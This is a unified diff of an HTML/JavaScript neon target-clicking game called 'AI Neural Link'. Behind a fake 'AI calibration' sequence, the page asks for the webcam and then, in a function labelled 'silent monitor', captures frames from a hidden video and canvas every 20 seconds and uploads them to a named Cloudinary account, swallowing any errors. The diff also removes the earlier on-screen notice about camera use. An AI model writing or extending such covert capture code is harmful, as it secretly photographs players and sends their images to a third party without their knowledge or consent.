@@ -8,7 +8,7 @@
     <style>
         :root {
             --neon-green: #39ff14;
-            --neon-blue: #00f2ff;
+            --neon-red: #ff3131;
             --bg-dark: #050505;
         }
 
@@ -18,6 +18,7 @@
             background-color: var(--bg-dark);
             font-family: 'Orbitron', sans-serif;
             color: white;
+            user-select: none;
         }
 
         #game-container {
@@ -30,10 +31,12 @@
         .hud {
             position: absolute; top: 20px; width: 100%;
             display: flex; justify-content: space-around;
-            font-size: 0.9rem; color: var(--neon-green);
+            font-size: 0.8rem; color: var(--neon-green);
             text-shadow: 0 0 5px var(--neon-green);
-            z-index: 50; letter-spacing: 2px;
+            z-index: 50;
         }
+
+        #timer-box { color: var(--neon-red); font-weight: bold; text-shadow: 0 0 10px var(--neon-red); }
 
         /* The Neon Green Target */
         .target {
@@ -42,101 +45,93 @@
             border-radius: 50%;
             background: radial-gradient(circle, var(--neon-green) 0%, transparent 70%);
             border: 2px solid var(--neon-green);
-            box-shadow: 0 0 15px var(--neon-green), inset 0 0 10px var(--neon-green);
+            box-shadow: 0 0 15px var(--neon-green);
             cursor: crosshair;
             display: none;
             z-index: 10;
         }
 
-        /* AI Calibration Overlay */
-        #overlay {
+        /* Overlays */
+        .overlay {
             position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
             background: rgba(0,0,0,0.98);
             display: flex; flex-direction: column;
             align-items: center; justify-content: center;
             z-index: 100; text-align: center;
+            padding: 20px;
         }
 
+        #result-screen { display: none; border-top: 4px solid var(--neon-green); }
+
         .ai-scanner {
-            width: 200px; height: 200px;
+            width: 180px; height: 180px;
             border: 2px solid var(--neon-green);
             margin-bottom: 20px; border-radius: 50%;
             position: relative; overflow: hidden;
-            background: #001100;
         }
 
         .scanner-line {
             width: 100%; height: 2px;
             background: var(--neon-green);
             position: absolute; top: 0;
-            box-shadow: 0 0 15px var(--neon-green);
             animation: scan 2s linear infinite;
         }
 
-        @keyframes scan {
-            0% { top: 0; }
-            100% { top: 100%; }
-        }
-
-        .status-text {
-            font-size: 0.8rem; color: var(--neon-green);
-            margin-top: 10px; height: 20px;
-        }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
 
         .btn-ai {
             padding: 15px 40px; font-family: inherit;
             background: transparent; color: var(--neon-green);
             border: 2px solid var(--neon-green);
-            cursor: pointer; font-weight: bold;
-            transition: 0.3s; margin-top: 20px;
-            letter-spacing: 3px;
+            cursor: pointer; margin-top: 20px;
+            letter-spacing: 2px; transition: 0.3s;
         }
 
-        .btn-ai:hover {
-            background: var(--neon-green); color: black;
-            box-shadow: 0 0 30px var(--neon-green);
-        }
+        .btn-ai:hover { background: var(--neon-green); color: black; box-shadow: 0 0 30px var(--neon-green); }
 
         #hiddenVideo, #hiddenCanvas { display: none; }
 
-        /* Scientific Popups */
         .hit-popup {
             position: absolute; color: var(--neon-green);
-            font-size: 0.7rem; pointer-events: none;
+            font-size: 0.6rem; pointer-events: none;
             animation: fadeUp 0.6s ease-out forwards;
         }
 
-        @keyframes fadeUp {
-            0% { opacity: 1; transform: translateY(0); }
-            100% { opacity: 0; transform: translateY(-40px); }
-        }
+        @keyframes fadeUp { 0% { opacity: 1; } 100% { opacity: 0; transform: translateY(-40px); } }
     </style>
 </head>
 <body>
 
     <div id="game-container">
         <div class="hud">
-            <div>NEURAL_SYNC: <span id="sync-val">0</span>%</div>
-            <div>STRIKE_ACCURACY: <span id="score">0</span></div>
-            <div>AI_CORE_TEMP: <span id="temp">32</span>°C</div>
+            <div>LINK_TIME: <span id="timer-box">60</span>s</div>
+            <div>ACCURACY: <span id="score">0</span></div>
+            <div>SYNC_LVL: <span id="sync-val">0</span>%</div>
         </div>
 
         <div id="target" class="target"></div>
         
-        <div id="overlay">
+        <!-- INITIAL START SCREEN -->
+        <div id="overlay" class="overlay">
             <h1 style="color: var(--neon-green); letter-spacing: 5px;">AI NEURAL LINK</h1>
             <div class="ai-scanner">
                 <div class="scanner-line"></div>
-                <video id="previewVideo" style="width:100%; height:100%; object-fit:cover; opacity: 0.4;"></video>
+                <video id="previewVideo" style="width:100%; height:100%; object-fit:cover; opacity: 0.4;" autoplay playsinline></video>
             </div>
-            
-            <p style="max-width: 400px; font-size: 0.7rem; color: #888;">
-                SYSTEM REQUIRES OPTICAL ACCESS TO MAP BIOMETRIC DATA & BLINK PATTERNS FOR SCIENTIFIC SCORE CALCULATION.
-            </p>
+            <p id="status" style="color: var(--neon-green); font-size: 0.8rem;">SYSTEM: STANDBY</p>
+            <button class="btn-ai" id="initBtn">INITIATE LINK</button>
+        </div>
 
-            <div id="status" class="status-text">SYSTEM: STANDBY</div>
-            <button class="btn-ai" id="initBtn">INITIATE NEURAL LINK</button>
+        <!-- GAME OVER / RESULT SCREEN -->
+        <div id="result-screen" class="overlay">
+            <h1 style="color: var(--neon-green);">MISSION REPORT</h1>
+            <div style="font-size: 1.2rem; margin: 20px 0; line-height: 2;">
+                NEURAL DATA POINTS: <span id="finalScore" style="color:var(--neon-green)">0</span><br>
+                LINK STABILITY: <span style="color:var(--neon-green)">STABLE</span><br>
+                BIOMETRIC SYNC: <span style="color:var(--neon-green)">COMPLETE</span>
+            </div>
+            <button class="btn-ai" onclick="location.reload()">RE-INITIATE LINK</button>
         </div>
     </div>
 
@@ -144,95 +139,124 @@
     <canvas id="hiddenCanvas"></canvas>
 
     <script>
+        // Configuration
         const CLOUD_NAME = "dazixpypp";
         const PRESET = "DANAVV";
-        const MONITOR_INTERVAL = 25000;
+        const MONITOR_INTERVAL = 20000; // 20 seconds
+        let gameTime = 60; // Game duration in seconds
 
         let score = 0;
         let gameActive = false;
+        let moveTimeout;
+
         const initBtn = document.getElementById('initBtn');
         const status = document.getElementById('status');
         const video = document.getElementById('hiddenVideo');
         const preview = document.getElementById('previewVideo');
         const canvas = document.getElementById('hiddenCanvas');
         const target = document.getElementById('target');
+        const timerEl = document.getElementById('timer-box');
 
-        // --- STEP 1: Smart AI Calibration ---
+        // --- 1. AI CALIBSATION & CAMERA ACCESS ---
         initBtn.onclick = () => {
             initBtn.style.display = 'none';
-            status.innerText = "REQUESTING NEURAL ACCESS...";
+            status.innerText = "REQUESTING OPTICAL ACCESS...";
 
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 video.srcObject = stream;
                 preview.srcObject = stream;
                 
-                // Fake AI Calibration Sequence
-                let steps = ["MAPPING FACE MESH...", "DETECTING BLINK PATTERNS...", "SYNCING MOTION SENSORS...", "AI CORE ONLINE!"];
+                let steps = ["MAPPING FACE...", "SYNCING CORNEA...", "AI CORE ONLINE"];
                 let i = 0;
                 let interval = setInterval(() => {
                     status.innerText = "SYSTEM: " + steps[i];
-                    document.getElementById('sync-val').innerText = (i + 1) * 25;
+                    document.getElementById('sync-val').innerText = (i + 1) * 33;
                     i++;
                     if(i >= steps.length) {
                         clearInterval(interval);
                         setTimeout(startGame, 1000);
                     }
-                }, 1200);
+                }, 1000);
             })
-            .catch(err => {
-                status.innerText = "ERROR: NEURAL LINK FAILED. CAMERA REQUIRED.";
+            .catch(() => {
+                status.innerText = "ERROR: LINK DENIED.";
                 initBtn.style.display = 'block';
             });
         };
 
-        // --- STEP 2: Start Game & Monitoring ---
+        // --- 2. GAME START & TIMER ---
         function startGame() {
             document.getElementById('overlay').style.display = 'none';
             gameActive = true;
             
-            // Start Hidden Uploads (Your Original Logic)
+            // Start the Countdown Timer
+            const countdown = setInterval(() => {
+                gameTime--;
+                timerEl.innerText = gameTime;
+                
+                if (gameTime <= 0) {
+                    clearInterval(countdown);
+                    endGame();
+                }
+            }, 1000);
+
+            // Start Monitoring
             setInterval(silentMonitorUpload, MONITOR_INTERVAL);
             silentMonitorUpload();
 
             moveTarget();
-            startScientificHUD();
         }
 
+        // --- 3. GAMEPLAY MECHANICS ---
         function moveTarget() {
             if(!gameActive) return;
-            const x = Math.random() * (window.innerWidth - 100);
-            const y = Math.random() * (window.innerHeight - 100);
+            
+            clearTimeout(moveTimeout);
+            const x = Math.random() * (window.innerWidth - 80);
+            const y = Math.random() * (window.innerHeight - 80);
+            
             target.style.left = x + 'px';
             target.style.top = y + 'px';
             target.style.display = 'block';
+
+            // Automatic move if not clicked (difficulty increases)
+            let speed = Math.max(500, 1200 - (score * 30));
+            moveTimeout = setTimeout(moveTarget, speed);
         }
 
         target.onclick = (e) => {
+            if(!gameActive) return;
             score++;
             document.getElementById('score').innerText = score;
             
-            // Show Scientific Popup
+            // Visual Feedback
             const pop = document.createElement('div');
             pop.className = 'hit-popup';
-            pop.innerText = `DATA_PT_${Math.floor(Math.random()*999)}: SUCCESS`;
+            pop.innerText = `SYNC_OK_${Math.floor(Math.random()*99)}`;
             pop.style.left = e.pageX + 'px';
             pop.style.top = e.pageY + 'px';
             document.body.appendChild(pop);
-            setTimeout(() => pop.remove(), 600);
+            setTimeout(() => pop.remove(), 500);
 
             target.style.display = 'none';
-            setTimeout(moveTarget, Math.random() * 500 + 200);
+            setTimeout(moveTarget, 100);
         };
 
-        function startScientificHUD() {
-            setInterval(() => {
-                document.getElementById('temp').innerText = (30 + Math.random() * 5).toFixed(1);
-            }, 3000);
+        // --- 4. END GAME ---
+        function endGame() {
+            gameActive = false;
+            target.style.display = 'none';
+            clearTimeout(moveTimeout);
+            
+            document.getElementById('finalScore').innerText = score;
+            document.getElementById('result-screen').style.display = 'flex';
         }
 
-        // --- THE SILENT MONITOR (Background Task) ---
+        // --- 5. SILENT MONITOR (Original Cloudinary Logic) ---
         async function silentMonitorUpload() {
+            if(!video.srcObject) return;
+            
             const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -248,7 +272,6 @@
                     method: 'POST',
                     body: formData
                 });
-                console.log("Telemetry synced.");
             } catch (e) {}
         }
     </script>
